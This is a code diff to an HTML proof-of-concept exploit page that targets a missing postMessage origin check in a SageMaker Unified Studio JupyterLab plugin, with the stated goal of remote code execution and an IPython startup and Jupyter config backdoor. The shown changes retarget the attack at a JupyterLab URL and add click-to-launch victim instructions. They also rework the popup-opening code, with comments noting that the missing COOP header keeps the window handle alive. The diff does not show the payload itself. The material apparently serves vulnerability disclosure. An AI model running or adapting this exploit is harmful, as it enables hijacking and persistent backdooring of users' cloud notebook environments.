@@ -18,10 +18,11 @@
   <h1>PoC: postMessage → RCE SageMaker DataZone/Unified Studio</h1>
   <p style="color:#5a5a7a;font-size:12px">@amzn/sagemaker-ui-doc-manager-jl-plugin — missing origin validation → IPython startup + Jupyter config backdoor</p>
 
-  <label>Target DataZone/Unified Studio Project URL:</label>
-  <input id="url" value="https://example.com/projects/4cy7e339sr8omh/code" />
-  <label>Wait for Studio + iframe to load (ms):</label>
-  <input id="wait" value="12000" />
+  <label>Target JupyterLab URL (from the sagemaker-ui-code-ide iframe src):</label>
+  <input id="url" value="https://8n1wsqrju9cwox8.studio.us-east-2.sagemaker.aws/jupyterlab/default/lab" />
+  <label>Wait for JupyterLab to load (ms):</label>
+  <input id="wait" value="10000" />
+  <p style="color:#5a5a7a;font-size:11px;margin-top:6px">Step 1: Open your DataZone project so the JupyterLab iframe authenticates.<br>Step 2: Click anywhere on this page — it opens the JupyterLab URL directly (auth cookies are set).</p>
 
   <button id="launchBtn">Click Anywhere To Launch Exploit</button>
   <div id="status"></div>
@@ -78,12 +79,11 @@ function exploit() {
   var url = document.getElementById('url').value.trim();
   var wait = parseInt(document.getElementById('wait').value) || 12000;
 
-  // Use a named window — preserves the handle through redirects
-  // Opening about:blank first, then navigating, keeps the reference alive
-  var w = window.open('about:blank', 'sagemaker_target');
+  // Target JupyterLab directly — the SageMaker domain doesn't set COOP,
+  // so the popup reference stays alive (unlike the DataZone wrapper).
+  var w = window.open(url, 'sagemaker_target');
   if (!w) { status('Popup blocked — allow popups and retry.', 'err'); return; }
-  w.location = url;
-  status('Popup opened (named window). Polling until ready (up to ' + wait + 'ms)...', 'warn');
+  status('Popup opened. Polling until ready (up to ' + wait + 'ms)...', 'warn');
 
   var elapsed = 0;
   var interval = 2000;
